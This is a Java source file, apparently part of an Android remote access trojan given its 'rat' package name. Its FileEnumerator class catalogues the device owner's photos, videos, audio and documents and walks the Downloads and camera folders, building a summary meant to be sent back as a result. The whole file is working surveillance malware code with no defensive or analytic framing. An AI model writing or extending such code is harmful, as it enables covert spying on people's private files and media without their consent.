package com.company.rat;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Enumerates files on external storage using MediaStore.
 * Returns a text summary suitable for sending as a result.
 */
public class FileEnumerator {

    private static final String TAG = "FileEnum";

    public static String listFiles(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== FILE ENUMERATION ===\n\n");

        // Images
        sb.append("-- IMAGES --\n");
        appendMedia(ctx, sb, MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.SIZE,
                             MediaStore.Images.Media.DATE_MODIFIED}, 100);

        // Videos
        sb.append("\n-- VIDEOS --\n");
        appendMedia(ctx, sb, MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media.DATA, MediaStore.Video.Media.SIZE,
                             MediaStore.Video.Media.DATE_MODIFIED}, 50);

        // Audio
        sb.append("\n-- AUDIO --\n");
        appendMedia(ctx, sb, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Audio.Media.DATA, MediaStore.Audio.Media.SIZE,
                             MediaStore.Audio.Media.DATE_MODIFIED}, 30);

        // Documents (API 29+)
        sb.append("\n-- DOCUMENTS --\n");
        try {
            appendMedia(ctx, sb, MediaStore.Files.getContentUri("external"),
                    new String[]{MediaStore.Files.FileColumns.DATA,
                                 MediaStore.Files.FileColumns.SIZE,
                                 MediaStore.Files.FileColumns.DATE_MODIFIED},
                    100);
        } catch (Exception e) {
            sb.append("(documents query error: ").append(e.getMessage()).append(")\n");
        }

        // Walk Downloads folder directly
        sb.append("\n-- DOWNLOADS DIR --\n");
        File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        appendDir(sb, dl, 0, 3);

        // Walk DCIM folder (photos taken by device camera)
        sb.append("\n-- DCIM DIR --\n");
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        appendDir(sb, dcim, 0, 2);

        return sb.toString();
    }

    private static void appendMedia(Context ctx, StringBuilder sb, Uri uri,
                                    String[] cols, int limit) {
        try (Cursor c = ctx.getContentResolver().query(
                uri, cols, null, null,
                cols[2] + " DESC LIMIT " + limit)) {
            if (c == null) { sb.append("(null cursor)\n"); return; }
            while (c.moveToNext()) {
                String path = c.getString(0);
                long   size = c.getLong(1);
                long   ts   = c.getLong(2);
                sb.append(path)
                  .append("  [").append(humanSize(size)).append("]")
                  .append("  ts=").append(ts).append("\n");
            }
        } catch (Exception e) {
            sb.append("(error: ").append(e.getMessage()).append(")\n");
            Log.w(TAG, "media query error", e);
        }
    }

    private static void appendDir(StringBuilder sb, File dir, int depth, int maxDepth) {
        if (dir == null || !dir.exists() || depth > maxDepth) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            String indent = "  ".repeat(depth);
            if (f.isDirectory()) {
                sb.append(indent).append("[DIR] ").append(f.getName()).append("\n");
                appendDir(sb, f, depth + 1, maxDepth);
            } else {
                sb.append(indent).append(f.getName())
                  .append("  [").append(humanSize(f.length())).append("]\n");
            }
        }
    }

    private static String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return (bytes / (1024 * 1024)) + " MB";
    }
}
